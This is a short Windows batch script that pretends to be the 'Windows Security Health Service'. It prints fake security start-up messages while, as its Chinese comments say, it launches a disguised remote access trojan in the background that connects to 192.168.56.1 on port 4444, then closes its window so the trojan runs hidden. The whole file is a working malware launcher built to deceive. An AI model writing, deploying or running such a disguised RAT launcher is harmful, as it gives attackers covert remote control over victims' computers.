@echo off
title Windows Security Health Service
echo [INFO] Starting Windows Security Health Service...
echo [INFO] Initializing security components...
echo [INFO] Loading threat detection modules...
echo [INFO] Service started successfully.

REM 启动伪装的RAT客户端
cd build\dist
start /B WindowsSecurityHealth.exe --host 192.168.56.1 --port 4444

REM 等待几秒钟让服务"初始化"
timeout /t 3 /nobreak >nul
echo [INFO] Security monitoring active.
echo [INFO] Service running in background.

REM 关闭窗口以隐蔽运行
exit 